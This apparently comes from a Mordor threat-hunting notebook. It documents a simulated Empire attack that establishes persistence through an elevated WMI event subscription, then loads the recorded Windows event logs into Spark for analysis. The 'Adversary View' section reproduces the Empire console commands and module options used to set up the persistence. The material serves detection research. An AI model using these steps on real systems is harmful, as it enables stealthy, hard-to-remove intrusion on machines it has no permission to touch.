---
redirect_from:
  - "/notebooks/small/windows/03-persistence/sd-190518184306"
interact_link: content/notebooks/small/windows/03_persistence/SD-190518184306.ipynb
kernel_name: 
kernel_path: content/notebooks/small/windows/03_persistence
has_widgets: false
title: |-
  Empire Elevated WMI Subscription
pagenum: 21
prev_page:
  url: /notebooks/small/windows/03_persistence/SD-190319023812.html
next_page:
  url: /notebooks/small/windows/03_persistence/SD-190319024742.html
suffix: .ipynb
search: wmi persistence false empire elevated powershell script default mordor tkvpx true trigger agent dataset module none run listener subscription simulation com description name proxy request tasked id windows github blob data psm master mattifestation stager using file cleanup switch specified user y metadata sd author roberto rodriguez cybrwardg creation date platform environment shire type c tool empireproject dev modulesource raw githubusercontent hunters forge datasets small empireelevatedwmi tar gz represents adversaries leveraging subscriptions adversary view usemodule info invoke needsadmin opsecsafe language minlanguageversion background outputextension authors harmjy persist permanent difficult detection removal rating comments powersploit pe rsistence options required value dailytime daily

comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
---

    <main class="jupyter-page">
    <div id="page-info"><div id="page-title">Empire Elevated WMI Subscription</div>
</div>
    <div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<table>
<thead><tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">SD-190518184306</td>
</tr>
<tr>
<td style="text-align:left">author</td>
<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
</tr>
<tr>
<td style="text-align:left">creation date</td>
<td style="text-align:left">19/05/18</td>
</tr>
<tr>
<td style="text-align:left">platform</td>
<td style="text-align:left">Windows</td>
</tr>
<tr>
<td style="text-align:left">Mordor Environment</td>
<td style="text-align:left">shire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Type</td>
<td style="text-align:left">C2</td>
</tr>
<tr>
<td style="text-align:left">Simulation Tool</td>
<td style="text-align:left">Empire</td>
</tr>
<tr>
<td style="text-align:left">Simulation Script</td>
<td style="text-align:left"><a href="https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1">https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1</a></td>
</tr>
<tr>
<td style="text-align:left">Mordor Dataset</td>
<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz</a></td>
</tr>
</tbody>
</table>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries leveraging WMI subscriptions for persistence.</p>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
<pre><code>(Empire: TKV35P8X) &gt; usemodule persistence/elevated/wmi*
(Empire: powershell/persistence/elevated/wmi) &gt; info

              Name: Invoke-WMI
            Module: powershell/persistence/elevated/wmi
        NeedsAdmin: True
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using a permanent WMI
  subscription. This has a difficult detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name        Required    Value                     Description
  ----        --------    -------                   -----------
  DailyTime   False                                 Daily time to trigger the script        
                                                    (HH:mm).                                
  ProxyCreds  False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  ExtFile     False                                 Use an external file for the payload    
                                                    instead of a stager.                    
  Cleanup     False                                 Switch. Cleanup the trigger and any     
                                                    script from specified location.         
  Agent       True        TKV35P8X                  Agent to run module on.                 
  Listener    True                                  Listener to use.                        
  SubName     True        Updater                   Name to use for the event subscription. 
  Proxy       False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  AtStartup   False       True                      Switch. Trigger script (within 5        
                                                    minutes) of system startup.             
  UserAgent   False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  FailedLogon False                                 Trigger script with a failed logon      
                                                    attempt from a specified user           

(Empire: powershell/persistence/elevated/wmi) &gt; set Listener https
(Empire: powershell/persistence/elevated/wmi) &gt; execute
[&gt;] Module is not opsec safe, run? [y/N] y
[*] Tasked TKV35P8X to run TASK_CMD_WAIT
[*] Agent TKV35P8X tasked with task ID 3
[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/wmi
(Empire: powershell/persistence/elevated/wmi) &gt; WMI persistence established using listener https with OnStartup WMI subsubscription trigger.

(Empire: powershell/persistence/elevated/wmi) &gt;</code></pre>

</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz&quot;</span>
<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
</pre></div>

    </div>
</div>
</div>

</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
<div class="text_cell_render border-box-sizing rendered_html">
<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
</div>
</div>
</div>
</div>

<div class="jb_cell">

<div class="cell border-box-sizing code_cell rendered">
<div class="input">

<div class="inner_cell">
    <div class="input_area">
<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT channel, COUNT(1)</span>
<span class="sd">FROM mordorTable</span>
<span class="sd">GROUP BY channel</span>
<span class="sd">    &#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="kc">False</span><span class="p">)</span>
        
</pre></div>

    </div>
</div>
</div>

</div>
</div>

 


    </main>
    